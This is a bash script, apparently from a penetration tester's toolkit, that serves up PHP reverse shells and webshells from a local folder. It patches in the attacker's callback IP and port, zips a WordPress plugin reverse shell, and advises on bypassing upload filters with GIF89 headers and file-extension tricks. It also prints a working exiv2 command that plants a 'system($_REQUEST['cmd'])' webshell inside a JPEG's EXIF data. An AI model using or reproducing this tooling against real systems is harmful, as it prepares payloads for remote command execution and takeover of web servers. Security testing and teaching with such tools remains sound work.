#!/bin/bash

# copy all php shells to ~/shells/
# just add another case for new ones!
# create a symlink for this to /usr/local/bin/evilphp or whatever!

# colours first
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${RED}"
figlet "EvilPHP"
echo -e "${NC}"
echo -e "${YELLOW}[+] Grab a PHP Shell of Eevil${NC}"

echo -e ""
echo -e "${BLUE}"
echo -e "Which shell would you like?"
echo -e "1 = reverse-php-shell (evil.php)"
echo -e "2 = Tiny php revshell (tiny.php)"
echo -e "3 = New php revshell (new.php)"
echo -e "4 = jpg header revshell (evil.jpg)"
echo -e "5 = simple-web-shell (shell.php)"
echo -e "6 = Wwolf-php-webshell (wolfwebshell.php)"
echo -e "7 = List of webshells to try"
echo -e "8 = Wordpress Plugin revshell (wp-evil.php)"
echo -e "9 = Jpeg with Exif impregnated webshell (sh1n.php5.jpg)"
echo -e "${NC}"
echo -e ""


# Case Statement
echo -e "${RED}"
read -p "Enter Selection: " shelltype
echo -e "${NC}"

# if no input prompt for a number
if [ -z $shelltype ];then
	echo "Just a number please..."
	exit
fi

case $shelltype in
	1)
        read -p "Enter lhost: " new_ip
        read -p "Enter lport: " new_port
        cat ~/shells/evil.php |sed -r 's/(\b[0-9]{1,3}\.){3}[0-9]{1,3}\b'/"$new_ip"/  |sed -r 's|^(\$port\s*=\s*).*|\$port = '$new_port'|' > evil.php
	echo -e "Copying evil.php to your pwd..."
	echo -e "${YELLOW}For a .gif file prepend GIF89 to the file${NC}"
	;;

	2)
        read -p "Enter lhost: " new_ip
        read -p "Enter lport: " new_port
        cat ~/shells/tiny.php |sed -r -e 's/(\b[0-9]{1,3}\.){3}[0-9]{1,3}\b'/"$new_ip"/ |sed -e 's/443/'"$new_port"'/g' > tiny.php
	echo -e "Copying tiny.php to your pwd..."
	;;


	3)
	echo -e "Copying new.php to your pwd..."
	echo -e "https://github.com/ivan-sincek/php-reverse-shell.git"
	echo -e "This repo is cloned in /opt folder, and worth checking out!"
	cp ~/shells/new.php .
	;;


	4)
	read -p "Enter lhost: " new_ip
        read -p "Enter lport: " new_port
        cat ~/shells/evil.jpg |sed -r 's/(\b[0-9]{1,3}\.){3}[0-9]{1,3}\b'/"$new_ip"/  |sed -r 's|^(\$port\s*=\s*).*|\$port = '$new_port'|' > evil.jpg
        echo -e "Copying evil.jpg to your pwd..."
	echo -e "You may need to play with file extensions to bypass filters"
	;;


	5)
	echo -e "Copying shell.php to your pwd..."
	cp ~/shells/shell.php .
	;;

	6)
	echo -e "Copying wolfwebshell.php to your pwd..."
	cp ~/shells/wolfwebshell.php .
	;;


	7)
	echo -e "${YELLOW}If the webshell is not working, try one of these...${NC}"
	cat ~/shells/php-shell-injection.txt
	;;


	8)
        read -p "Enter lhost: " new_ip
        read -p "Enter lport: " new_port
        cat ~/shells/wp-evil.php |sed -r 's/(\b[0-9]{1,3}\.){3}[0-9]{1,3}\b'/"$new_ip"/  |sed -r 's|^(\$port\s*=\s*).*|\$port = '$new_port'|' > wp-evil.php
	echo -e "Copying wp-evil.php to your pwd..."
	echo -e "${BLUE}7z a wp-evil.zip wp-evil.php${NC}"
        7z a wp-evil.zip wp-evil.php
	;;


	9)
	echo -e "Copying sh1n.php5.jpg to your pwd..."
	echo -e "You may need to play with file extensions to bypass filters."
	echo -e "${YELLOW}example: Inject a .jpg file with a webshell...${NC}"
	echo -e "${YELLOW}exiv2 -c'A \"<?php system(\$_REQUEST['cmd']);?>\"!' backdoor.jpeg${NC}"
	cp ~/shells/sh1n.php5.jpg .
	;;


	*)
	echo -e "${RED}[-] Sorry,Not Found! ${NC}"
	echo -e ""
	exit

esac
